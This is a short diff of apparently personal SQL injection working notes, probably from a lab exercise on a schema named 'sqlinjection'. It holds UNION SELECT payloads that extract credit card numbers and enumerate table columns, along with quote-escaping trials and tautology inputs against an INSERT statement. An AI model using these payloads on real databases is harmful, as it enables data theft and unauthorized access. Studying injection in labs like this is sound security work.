@@ -7,39 +7,16 @@ UNION SELECT creditcard_number,2,3 FROM sqlinjection.payments
 UNION SELECT data,2,3 FROM sqlinjection.share4 <----------- DECODE FROM BASE64
 
 
+'
+'
+'
+'
+'
+('''', '''', ''', '''', '''', 3)
 
 
-
-
-
-
-
-
-INSERT INTO members ->
-('', '', 'Hacker', '1', '2', 3)
-('', '', 'Hacker', '1', '2'',''1', 3) 
-('', '', 'Hacker', '1', '2/'',/''1', 3) 
-('', '', 'Hacker', '1', '2\'',\''1', 3)
-('', '', 'Hacker', '1', '2'', ''1', 3)
-('', '', 'Hacker', '1', '2'', ''1'', ''', 3)
-
-
-
-
-
-
-
-
-
-'2', 1)
-
-2', 1\)                   '2'', 1\)', 3) 
-2\', 1)                   '2\'', 1)', 3)
-2\'\, 1)                  '2\''\, 1)', 3)
-2\'\, '1\)                '2\''\, ''1\)', 3)
-' OR 1='1                 ''' OR 1=''1', 3)
-1' OR 1='1' OR 3='        '1'' OR 1=''1'' OR 3=''', 3)
-
+want -----> ('Hack', 'er', 'Hacker', '1', '1', 1)
+current --> ('Hack', 'er', 'Hacker', '1', '1', 3)
 
 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE table_schema = 'sqlinjection'
 ----------------------------------------------------
